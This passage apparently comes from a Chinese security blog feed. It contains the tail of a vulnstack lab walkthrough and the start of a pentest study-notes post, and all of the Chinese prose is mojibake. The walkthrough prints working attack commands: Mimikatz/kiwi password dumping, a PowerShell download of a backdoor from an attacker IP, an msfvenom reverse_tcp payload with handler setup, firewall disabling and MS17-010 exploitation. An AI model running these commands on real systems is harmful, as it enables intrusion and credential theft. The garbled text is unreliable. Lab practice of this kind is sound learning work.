href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h5><p><a href="https://blog.csdn.net/weixin_40412037/article/details/113348310">å†…ç½‘æ¸—é€ç¥å™¨ï¼ˆMimikatzï¼‰â€”â€”ä½¿ç”¨æ•™ç¨‹-CSDNåšå®¢</a></p><p>å‰æ–‡å·²ç»æ‹¿åˆ°äº†systemæƒé™ï¼Œåˆ©ç”¨ç›¸å…³å·¥å…·å¯ä»ç³»ç»Ÿæˆ–æ³¨å†Œè¡¨è·å–æ˜æ–‡å¯†ç (éœ€ä¸Šä¼ mimikatzå·¥å…·)</p><h5 id="kiwi"><a href="#kiwi" class="headerlink" title="kiwi"></a>kiwi</h5><p>msfä¸Šå†…ç½®äº†mimikatzæ¨¡å—ï¼Œæ”¹åä¸ºkiwiï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># meterpreter &gt;</span><br><br><span class="hljs-comment"># å…ˆè¿›ç¨‹è¿ç§»(ä¹‹å‰ä¼ é€’çš„åé—¨æ–‡ä»¶æ˜¯32ä½çš„ï¼Œéœ€è¦è¿ç§»åˆ°ä»»æ„64ä½è¿›ç¨‹)</span><br><span class="hljs-attribute">ps</span><br><span class="hljs-attribute">migrate</span> <span class="hljs-number">384</span>(ä»»æ„<span class="hljs-number">64</span>ä½è¿›ç¨‹pid)<br><br><span class="hljs-attribute">load</span> kiwi<br><span class="hljs-attribute">kiwi_cmd</span> sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201154424561.png" alt="image-20231201154424561"> </p><h4 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h4><p>æˆ‘ä»¬ç›®å‰å–å¾—äº†win7çš„ç®¡ç†å‘˜æƒé™ï¼Œä¸‹ä¸€æ­¥å‘ç°å†…ç½‘å…¶ä»–ä¸»æœºã€æ‰«ææ¼æ´å¹¶å°è¯•åˆ©ç”¨</p><h5 id="é¶æœºä¸‹è½½æ–‡ä»¶"><a href="#é¶æœºä¸‹è½½æ–‡ä»¶" class="headerlink" title="é¶æœºä¸‹è½½æ–‡ä»¶"></a>é¶æœºä¸‹è½½æ–‡ä»¶</h5><p>æˆ‘ä»¬æ‹¿åˆ°ä¸€ä¸ªé¶æœºçš„shellåï¼Œå¯èƒ½ä¼šæœ‰åœ¨é¶æœºä¸Šä¸‹è½½æˆ–ä¸Šä¼ æ–‡ä»¶çš„éœ€è¦ï¼Œæœ‰äº›åœ¨æ”»å‡»æœºä¸Šï¼Œæœ‰äº›åœ¨ç½‘ç»œç¯å¢ƒ(ä¸å‡ºç½‘çš„å°±åªèƒ½é€šè¿‡å…¶ä»–é¶æœºçš„ä»£ç†æˆ–è€…å†…ç½‘ç©¿é€)</p><ol><li><p><strong>powershell</strong> (æ‹¿ä¹‹å‰ä¸Šä¼ åé—¨æ–‡ä»¶ä¸¾ä¾‹)</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">powershell (<span class="hljs-built_in">new</span>-<span class="hljs-keyword">object</span> <span class="hljs-keyword">System</span>.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://192.168.48.129:9999/safe.exe&#x27;</span>,<span class="hljs-string">&#x27;safe.exe&#x27;</span>)<br></code></pre></td></tr></table></figure></li><li><p><strong>wget</strong></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-meta"># wgetä¸‹è½½åœ°å€</span><br><span class="hljs-symbol">https:</span>//eternallybored<span class="hljs-meta">.org</span>/misc/wget/<br></code></pre></td></tr></table></figure></li><li><p><strong>winscp</strong>è¿œç¨‹æ¡Œé¢</p></li><li><p><strong>meterpreter</strong> upload</p></li></ol><p><a href="https://zhuanlan.zhihu.com/p/132644184">Windowsè¿œç¨‹æ–‡ä»¶ä¸‹è½½æ‰§è¡Œçš„15ç§å§¿åŠ¿ - çŸ¥ä¹ (zhihu.com)</a></p><h5 id="å†…ç½‘æ”¶é›†1-fscan"><a href="#å†…ç½‘æ”¶é›†1-fscan" class="headerlink" title="å†…ç½‘æ”¶é›†1 - fscan"></a>å†…ç½‘æ”¶é›†1 - fscan</h5><ul><li><p><a href="https://github.com/shadow1ng/fscan">shadow1ng&#x2F;fscan: ä¸€æ¬¾å†…ç½‘ç»¼åˆæ‰«æå·¥å…·ï¼Œæ–¹ä¾¿ä¸€é”®è‡ªåŠ¨åŒ–ã€å…¨æ–¹ä½æ¼æ‰«æ‰«æã€‚ (github.com)</a></p></li><li><p>ä¸Šä¼ fscanåˆ°é¶æœºå¹¶è¿è¡Œ <code>fscan.exe -h 192.168.52.1/24</code></p></li><li><p>è¿è¡ŒæŠ¥é”™äº†ï¼ŒæŸ¥æ–‡æ¡£è¯´éœ€è¦é…ç½®goç¯å¢ƒï¼Œéº»çƒ¦</p></li></ul><h5 id="å†…ç½‘æ”¶é›†2-csä»£ç†"><a href="#å†…ç½‘æ”¶é›†2-csä»£ç†" class="headerlink" title="å†…ç½‘æ”¶é›†2 - csä»£ç†"></a>å†…ç½‘æ”¶é›†2 - csä»£ç†</h5><ol><li><p>å…ˆç”Ÿæˆä¸€ä¸ªwinåé—¨ç¨‹åºï¼ŒæŒ‰ç…§å‰æ–‡æ–¹å¼ï¼Œä¾æ¬¡ä¸Šä¼ ã€è¿è¡Œã€åˆ›å»ºå®šæ—¶ä»»åŠ¡ã€éšè—æ–‡ä»¶(å¦‚æœä¸€å¼€å§‹å°±ç”¨csç¥å™¨ä¹Ÿæ²¡è¿™ä¹ˆå¤šäº‹äº†hhh)<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201171640358.png" alt="image-20231201171640358"></p></li><li><p>å…³äºcsçš„å®‰è£…å’Œä½¿ç”¨å‚è€ƒæ–‡ç« æœ«å°¾ç›¸å…³èµ„æºï¼Œæ­¤å¤„ç›´æ¥èµ°socksä»£ç†<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231201171841342.png" alt="image-20231201171841342"></p></li><li><p>ä¿®æ”¹ <code>/etc/proxychains.conf</code> çš„ sock4 ä¸º <code>127.0.0.1 11451</code> , å¹¶åœ¨<code>meterpreter</code> ä¸­æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">setg Proxies socks<span class="hljs-number">4:127.0.0</span>.<span class="hljs-number">1:11451</span><br></code></pre></td></tr></table></figure></li><li><p>æ¥ä¸‹æ¥ä¾¿å¯ä»¥åˆ©ç”¨æˆ‘ä»¬æœ¬åœ°çš„å·¥å…·è¿›è¡Œæ‰«æ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># netdiscover</span><br><span class="hljs-attribute">proxychains</span> netdiscover<br><br><span class="hljs-comment"># nmap</span><br><span class="hljs-attribute">proxychains</span> nmap -A -sS -sV <span class="hljs-number">192.168.52.138</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>é€Ÿåº¦æ„Ÿäºº<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202113659562.png" alt="image-20231202113659562"></p></li><li><p>æ¢ä¸ªæ€è·¯ï¼Œåœ¨é¶æœºä¸Šä¸Šä¼ nmapè¿›è¡Œæ‰«æ(æ¡Œé¢æˆªå›¾å‘ç°å±…ç„¶è‡ªå¸¦çš„æœ‰)ï¼Œåœ°å€ä¸º <code> C:\Program Files (x86)\Nmap</code> </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">shell</span> nmap -A -sS -sV <span class="hljs-number">192.168.52.138</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202115734625.png" alt="image-20231202115734625"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202115808187.png" alt="image-20231202115808187"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202120036461.png" alt="image-20231202120036461"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202120108061.png" alt="image-20231202120108061"></p></li></ol><h5 id="å†…ç½‘æ”¶é›†3-msfè·¯ç”±"><a href="#å†…ç½‘æ”¶é›†3-msfè·¯ç”±" class="headerlink" title="å†…ç½‘æ”¶é›†3 - msfè·¯ç”±"></a>å†…ç½‘æ”¶é›†3 - msfè·¯ç”±</h5><p>ä¸Šé¢çš„csä»£ç†ä¸çŸ¥é“æŠ½ä»€ä¹ˆé£ç”¨ä¸äº†ï¼Œè¿™é‡Œæ”¹ç”¨msfçš„è·¯ç”±</p><ol><li><p>msfåˆ©ç”¨ <code>epxloit/multi/handler</code> æ¨¡å—ï¼Œç›‘å¬æœ¬æœºçš„ <code>4444</code> ç«¯å£</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams"># msf<br>use exploit/multi/handler<br><span class="hljs-keyword">set</span> lhost <span class="hljs-comment">192.168.48.129</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 4444(</span>é»˜è®¤<span class="hljs-comment">)</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">payload windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br></code></pre></td></tr></table></figure></li><li><p>ä¹‹å‰è®¾ç½®é‡Œè®¡åˆ’ä»»åŠ¡(safe.exe)ï¼Œå¾ˆå¿«å°±å›ä¼ è¿‡æ¥ï¼Œæ‰§è¡Œè¯­å¥å°†å½“å‰sessionåˆ›å»ºä¸ºè·¯ç”±</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-comment"># meterpreter</span><br>ps<br>migrate <span class="hljs-number">384</span>(ä»»æ„x64è¿›ç¨‹ï¼Œæ­¤å¤„é€‰æ‹©wininit)<br><span class="hljs-keyword">run</span><span class="language-bash"> post/multi/manage/autoroute</span><br></code></pre></td></tr></table></figure><p>æ­¤æ—¶æŠ¥é”™ <code>session, expected Session object got Msf::Sessions::Meterpreter_x86_Win</code></p><p>çŒœæµ‹æ˜¯ä¹‹å‰ä¸Šä¼ çš„32ä½é©¬å­ä¸ç¬¦åˆè¦æ±‚ï¼Œæˆ‘ä»¬é‡æ–°ä¸Šä¼ ä¸€ä¸ª64ä½çš„é©¬å­ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.48.129  <span class="hljs-attribute">LPORT</span>=4444 -f exe -o safe_64.exe<br></code></pre></td></tr></table></figure></li><li><p>æŒ‰ç…§ä¹‹å‰çš„æ–¹å¼ä¾æ¬¡ä¸Šä¼ ã€éšè—ã€è®¡åˆ’ä»»åŠ¡ã€å¹¶åœ¨msfè¿›è¡Œç›‘å¬ï¼Œæ­¤æ—¶å†å¼€å¯è·¯ç”±æ¨¡å—ä¾¿æ­£å¸¸äº†</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># msf</span><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> lhost 192.168.48.129<br><span class="hljs-built_in">set</span> lport 4444<br>exploit<br><br><span class="hljs-comment"># meterpreter&gt;</span><br><span class="hljs-built_in">run</span> post/multi/manage/autoroute<br></code></pre></td></tr></table></figure><p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202192155216.png" alt="image-20231202192155216"></p></li><li><p>è·¯ç”±å¼€å¯åæˆ‘ä»¬å°è¯•è¿›è¡Œarpæ‰«æï¼Œéå¸¸çš„èˆ’æœå•Š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># meterpreter&gt;</span><br><span class="hljs-built_in">run</span> post/windows/gather/arp_scanner <span class="hljs-attribute">rhosts</span>=192.168.52.0/24<br><br><span class="hljs-comment"># å½“å‰ä¼šè¯æŒ‚åå°</span><br>bg(background)<br></code></pre></td></tr></table></figure><p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203115302684.png" alt="image-20231203115302684"></p></li></ol><h5 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h5><ol><li><p>nmapæ¼æ‰«æ’ä»¶æ‰«ä¸€æ‰«</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># cs beacon&gt;</span><br><span class="hljs-built_in">shell</span> nmap <span class="hljs-comment">--script=vuln 192.168.52.141</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202121821429.png" alt="image-20231202121821429"></p><p>ms08-067  ms17-010</p></li><li><p>éœ€è¦å…ˆå…³é—­win7çš„é˜²ç«å¢™ï¼Œå¦åˆ™ä¼šå‡ºç°ä»¥ä¸‹å†…å®¹<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231202143323918.png" alt="image-20231202143323918"></p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-comment"># å…³é—­é˜²ç«å¢™ cs beacon&gt;</span><br>shell netsh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off<br></code></pre></td></tr></table></figure></li><li><p>å‰é¢æ‹¿åˆ°äº†å†…ç½‘çš„è·¯ç”±(æˆ–è€…ä»£ç†)ï¼Œæ­¤å¤„ç”¨msfè¿›è¡Œæ¼æ´å‘ç°å’Œåˆ©ç”¨</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># msf&gt;</span><br>use auxiliary/scanner/smb/smb_ms17_010<br>show options<br><span class="hljs-built_in">set</span> rhosts 192.168.52.138/24<br><span class="hljs-built_in">set</span> threads 50<br>run<br></code></pre></td></tr></table></figure><p><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203120354256.png" alt="image-20231203120354256"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_psexec<br><span class="hljs-built_in">set</span> rhost 192.168.52.141<br><span class="hljs-built_in">set</span> payload windows/meterpreter/bind_tcp(å¿…é¡»æ˜¯<span class="hljs-built_in">bind</span>)<br>run<br></code></pre></td></tr></table></figure><p>å¤±è´¥â€¦æ¢ä¸ªé¶æœºâ€¦å¤±è´¥â€¦æ¢ä¸ªæ¼æ´â€¦è¿˜æ˜¯å¤±è´¥â€¦<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203122046969.png" alt="image-20231203122046969"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203122212018.png" alt="image-20231203122212018"><img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203122249273.png" alt="image-20231203122249273"></p></li><li><p>å„ç§æ–¹æ³•éƒ½ä¸è¡Œï¼Œåˆ«äººä¸€æ‰“ä¸€ä¸ªå‡†ï¼Œæˆ‘ä¸€æ‰“ä¸€ä¸ªä¸å±å£°ã€‚<del>ä¸å­¦äº†å‘œå‘œå‘œ</del></p></li></ol><h5 id="æ£€æŸ¥å¤±è´¥åŸå› "><a href="#æ£€æŸ¥å¤±è´¥åŸå› " class="headerlink" title="æ£€æŸ¥å¤±è´¥åŸå› "></a>æ£€æŸ¥å¤±è´¥åŸå› </h5><p>æ¼æ´æ¢æµ‹æ¨¡å—æ˜¯æ²¡é—®é¢˜çš„ï¼Œèƒ½é€šè¿‡è·¯ç”±å‘ç°å­˜åœ¨æ¼æ´ï¼Œæ”»å‡»çš„æ—¶å€™å‡ºäº†é—®é¢˜ï¼Œæ¢æµ‹ä¸åˆ°å¼€æ”¾çš„ç«¯å£ï¼Œåˆ©ç”¨msfçš„ä»£ç†æ¨¡å—åŠ ä¸ª <code>proxychains</code> nmapè¯•è¯•<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203124202191.png" alt="image-20231203124202191"></p><p>å˜¶ï¼Œè¿™ä»£ç†å°±æ²¡ç”¨ï¼Œå†æ¬¡å°è¯•csçš„ä»£ç†ï¼Œä¹Ÿæ²¡ç”¨â€¦</p><h5 id="å†…ç½‘æ”¶é›†4-nps"><a href="#å†…ç½‘æ”¶é›†4-nps" class="headerlink" title="å†…ç½‘æ”¶é›†4 - nps"></a>å†…ç½‘æ”¶é›†4 - nps</h5><p>æ²¡åŠæ³•äº†ï¼Œåœ¨é¶æœºä¼ ä¸€ä¸ªnpcï¼Œåˆ©ç”¨æˆ‘ä»¬ä»¥å‰æ­å»ºåœ¨é˜¿é‡Œäº‘ä¸Šçš„npsè¿›è¡Œä¸€ä¸‹ä»£ç†æœåŠ¡ã€‚</p><p>ç ´é˜²äº†å“¥ï¼Œè¿˜æ˜¯æ²¡ç”¨ï¼Œä»£ç†æ˜¯æŒ‚ä¸Šå»äº†ï¼Œä½†æ˜¯ç”¨çš„æ—¶å€™å‡ºé—®é¢˜ï¼Œæƒ³ä¸æ˜ç™½<img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203150644924.png" alt="image-20231203150644924"></p><h5 id="æ”¾å¼ƒï¼Ÿ"><a href="#æ”¾å¼ƒï¼Ÿ" class="headerlink" title="æ”¾å¼ƒï¼Ÿ"></a>æ”¾å¼ƒï¼Ÿ</h5><p>æ€è€ƒä¸å‡ºæ¥ï¼Œæœä¸åˆ°ï¼Œæ”¾å¼ƒäº†å—ï¼Ÿnonono è¿˜æœ‰ä¸€æ‹›ï¼Œé—®ï¼</p><p>æŠŠé‡åˆ°çš„é—®é¢˜ç®€åŒ–ä¸€ä¸‹æ‹¿å»é—®é—® xlc <img src="/2023/11/30/vulnstack%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0-1/image-20231203151835605.png" alt="image-20231203151835605"></p><p>å¥½äº†ï¼Œç°åœ¨å¤§å®¶éƒ½çŸ¥é“æˆ‘æ˜¯æ‹¿nmapæŒ‚ä»£ç†çš„æ†¨æ‰¹äº†ï¼Œä»£ç†ä¸ç¨³å®šç¡®å®æ˜¯æ¯”è¾ƒé‡è¦çš„åŸå› ï¼Œå› ä¸ºæ˜¯å†…ç½‘å°±ä¸‹æ„è¯†å¿½ç•¥äº†ç½‘ç»œåŸå› ï¼Œå›åˆ°å†…ç½‘æ”¶é›†2&#x2F;3ï¼Œç»è¿‡æˆ‘åå¤çš„æµ‹è¯•ï¼Œç»ˆäºç¡®å®šï¼Œèµ°ä¸é€šã€‚ã€‚ã€‚</p><h5 id="é­”å¹»ä¸–ç•Œ"><a href="#é­”å¹»ä¸–ç•Œ" class="headerlink" title="é­”å¹»ä¸–ç•Œ"></a>é­”å¹»ä¸–ç•Œ</h5><p>æœ€ååœ¨xlcçš„æŒ‡å¯¼ä¸‹æäº†å‡ ä¸ªå°æ—¶ï¼Œå®åœ¨æ²¡åŠæ³•äº†ï¼Œç›´æ¥æŠŠé¶æœºæ”¾åœ¨kaliçš„ç½‘å¡ä¸‹å°è¯•æ¼æ‰«ï¼Œå¥½å®¶ä¼™ç›´æ¥æ²¡æ´äº†ï¼Œxlcè¯´æˆ‘ç¯å¢ƒæ—¥åäº†ï¼Œæˆ‘å»é‡æ–°ä¸‹äº†2003é¶æœºï¼Œè¿˜æ˜¯æ‰«ä¸å‡ºæ¥ï¼Œæ¢çƒ­ç‚¹å°±åˆè¡Œäº†ï¼Ÿï¼Ÿ(ä¸‡æ¶çš„æ ¡å›­ç½‘) ä½†æ˜¯æ¢çƒ­ç‚¹ä¹Ÿåªæ˜¯èƒ½æ‰«åˆ°æ´ï¼Œè¿˜æ˜¯åˆ©ç”¨ä¸äº†ï¼Œæœªæœï¼Œå¯»ç—…ç»ˆâ€¦</p><h4 id="ç›¸å…³èµ„æº"><a href="#ç›¸å…³èµ„æº" class="headerlink" title="ç›¸å…³èµ„æº"></a>ç›¸å…³èµ„æº</h4><p><a href="https://github.com/guchangan1/All-Defense-Tool">guchangan1&#x2F;All-Defense-Tool: å…¨ç½‘ä¼˜ç§€æ”»é˜²æ­¦å™¨å·¥å…·é¡¹ç›®æœé›†</a></p><p><a href="https://github.com/TryGOTry/CobaltStrike_Cat_4.5">TryGOTry&#x2F;CobaltStrike_Cat_4.5: çŒ«çŒ«Cs:åŸºäºCobalt Strike_4.5äºŒå¼€ (åŸdogcsäºŒå¼€ç§»æ¤) (github.com)</a></p><p><a href="https://github.com/k8gege/Ladon">k8gege&#x2F;Ladon: Ladonå¤§å‹å†…ç½‘æ¸—é€å·¥å…·</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>è§£é¢˜è®°å½•</tag>
      
      <tag>å­¦ä¹ </tag>
      
      <tag>vulnstack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘å®‰å­¦ä¹ ç¬”è®°(æŒç»­æ›´æ–°ä¸­)</title>
    <link href="/2023/11/26/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/"/>
    <url>/2023/11/26/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/</url>
    
    <content type="html"><![CDATA[<h2 id="çŸ¥è¯†è¡¥å……"><a href="#çŸ¥è¯†è¡¥å……" class="headerlink" title="çŸ¥è¯†è¡¥å……"></a>çŸ¥è¯†è¡¥å……</h2><h3 id="å…è®¸æµ‹è¯•çš„ç½‘é¡µ"><a href="#å…è®¸æµ‹è¯•çš„ç½‘é¡µ" class="headerlink" title="å…è®¸æµ‹è¯•çš„ç½‘é¡µ"></a>å…è®¸æµ‹è¯•çš„ç½‘é¡µ</h3><ul><li><a href="http://testfire.net/">http://testfire.net/</a></li><li>vulnweb.com</li></ul><h3 id="å·¥å…·æ”¶é›†ä¿¡æ¯"><a href="#å·¥å…·æ”¶é›†ä¿¡æ¯" class="headerlink" title="å·¥å…·æ”¶é›†ä¿¡æ¯"></a>å·¥å…·æ”¶é›†ä¿¡æ¯</h3><ul><li>æ°´æ³½(<strong>kali</strong>::  python3.7 shuize.py -d domain)</li><li>ç¯å¡”(<strong>tencent</strong>::  docker-composeå¯åŠ¨ååœ¨5003ç«¯å£è®¿é—®)</li></ul><h3 id="app-web"><a href="#app-web" class="headerlink" title="app-&gt;web"></a>app-&gt;web</h3><ul><li>åç¼–è¯‘(æ¼äº†ä¸ªå¤§æ´)</li><li>æŠ“åŒ…(burp)</li></ul><h3 id="CDNæ£€æŸ¥-ç»•è¿‡"><a href="#CDNæ£€æŸ¥-ç»•è¿‡" class="headerlink" title="CDNæ£€æŸ¥&#x2F;ç»•è¿‡"></a>CDNæ£€æŸ¥&#x2F;ç»•è¿‡</h3><ul><li>è¶…çº§ping</li><li><a href="http://ping.chinaz.com/">ç«™é•¿ä¹‹å®¶</a></li><li><a href="http://ping.aizhan.com/">çˆ±ç«™ç½‘</a></li><li><a href="http://tool.chinaz.com/nslookup/">http://tool.chinaz.com/nslookup/</a></li><li><a href="https://www.17ce.com/">https://www.17ce.com/</a></li><li>å­åŸŸåæŸ¥è¯¢</li><li>é‚®ä»¶æœåŠ¡</li><li>å›½å¤–åœ°å€ å¦‚<a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></li><li>é—ç•™æ–‡ä»¶æŸ¥è¯¢ å¦‚PHPinfo</li><li>fuckcdn w8fuckcdn zmap</li></ul><h3 id="wafæ£€æŸ¥"><a href="#wafæ£€æŸ¥" class="headerlink" title="wafæ£€æŸ¥"></a>wafæ£€æŸ¥</h3><ul><li>wafwoof</li><li><a href="https://github.com/stamparm/identywaf">https://github.com/stamparm/identywaf</a></li><li>rebots.txt</li><li>ç½‘é¡µæºç æ£€æŸ¥</li></ul><h3 id="cmså»ºç«™å¹³å°è¯†åˆ«"><a href="#cmså»ºç«™å¹³å°è¯†åˆ«" class="headerlink" title="cmså»ºç«™å¹³å°è¯†åˆ«"></a>cmså»ºç«™å¹³å°è¯†åˆ«</h3><ul><li><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></li><li><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a></li></ul><h3 id="ipå‘ç°"><a href="#ipå‘ç°" class="headerlink" title="ipå‘ç°"></a>ipå‘ç°</h3><ul><li>kali ä¸Šçš„ netdiscover</li></ul><h3 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h3><ul><li>Nmaps -sV</li><li>é»‘æš—å¼•æ“</li></ul><h3 id="ç½‘ç«™-æœåŠ¡å™¨ä¿¡æ¯æœç´¢"><a href="#ç½‘ç«™-æœåŠ¡å™¨ä¿¡æ¯æœç´¢" class="headerlink" title="ç½‘ç«™&#x2F;æœåŠ¡å™¨ä¿¡æ¯æœç´¢"></a>ç½‘ç«™&#x2F;æœåŠ¡å™¨ä¿¡æ¯æœç´¢</h3><ul><li>bing&#x2F;google&#x2F;baidu</li><li>shodan</li><li>zoomeye</li><li>fofa</li></ul><h3 id="å­åŸŸåæŒ–æ˜"><a href="#å­åŸŸåæŒ–æ˜" class="headerlink" title="å­åŸŸåæŒ–æ˜"></a>å­åŸŸåæŒ–æ˜</h3><ul><li>teemo(python)</li><li>layer(exe)</li><li>è¯ä¹¦æŸ¥è¯¢(å­åŸŸåå…¬ç”¨)</li><li><a href="https://crt.sh/">crt.sh | Certificate Search</a></li></ul><h3 id="åŒipã€æ—æ³¨ã€Cæ®µ"><a href="#åŒipã€æ—æ³¨ã€Cæ®µ" class="headerlink" title="åŒipã€æ—æ³¨ã€Cæ®µ"></a>åŒipã€æ—æ³¨ã€Cæ®µ</h3><ul><li><a href="https://www.webscan.cc/">https://www.webscan.cc/</a></li></ul><h3 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h3><ul><li>å¾¡å‰‘</li><li>dirsearch -u url(s)</li><li>dirb(kali)</li></ul><h3 id="å‚æ•°çˆ†ç ´"><a href="#å‚æ•°çˆ†ç ´" class="headerlink" title="å‚æ•°çˆ†ç ´"></a>å‚æ•°çˆ†ç ´</h3><ul><li><p>ffuf(kali)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/Web-Content/</span>burp-parameter-names.txt:PARAM -u http:<span 